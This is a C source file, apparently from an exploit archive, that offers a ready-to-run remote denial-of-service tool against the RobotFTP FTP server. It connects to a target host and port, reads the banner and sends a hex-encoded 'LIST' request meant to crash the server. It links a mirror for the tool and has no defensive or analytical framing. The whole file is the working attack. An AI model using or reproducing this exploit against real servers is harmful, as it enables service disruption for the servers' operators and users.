/****************************************************************************
 *                                                                          *
 * Remote DoS                                                               *
 * Mirror at: http://norpius.altervista.org/robo.zip                        *
 * I have done this only for my birthday :) - Robo-SOFT don't be angry :)   *
 *                                                                          *
 ***************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#ifdef WIN32
    #include <winsock.h>
    #include <windows.h>
    #define close closesocket
#else
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif
#define DOSREQUEST "\x4C\x49\x53\x54\r\n"

void errore( char *err )
{
        printf("%s",err);
        exit(1);
}

void usage( char *progz )
{
        fputs("Robotftp FTP Server remote DoS\n"
              "By NoRpiUs\n"
              "Usage: <host> <port>\n", stdout);
        exit(1);
}

int main( int argc, char *argv[] )
{
        int sock;
        struct hostent *he;
        struct sockaddr_in target;
        char recvbuff[512];

#ifdef WIN32
    WSADATA wsadata;
    WSAStartup(0x1, &wsadata);
#endif

        if ( argc < 3 ) usage(argv[0]);

        if ( (he = gethostbyname(argv[1])) == NULL )
                errore("[-] Can't resolve host\n");

        target.sin_family = AF_INET;
        target.sin_addr   = *(( struct in_addr *) he -> h_addr );
        target.sin_port   = htons(atoi(argv[2]));

        fputs("[+] Connecting...\n", stdout);

        if ( (sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP )) < 0)
                errore("[-] Can't create socket\n");

        if ( connect(sock, (struct sockaddr *) &target, sizeof(target)) < 0 )
                errore("[-] Can't connect\n");

        if ( recv( sock, recvbuff, sizeof(recvbuff), 0) < 0 )
                errore("[-] Server seems to be down\n");

        fputs("[+] Sending DoS request\n", stdout);

        if ( send( sock, DOSREQUEST, strlen(DOSREQUEST), 0) < 0 )
                errore("[-] Cant' send the request\n");

        fputs("[+] Done\n", stdout);

        close(sock);

        return(0);

}

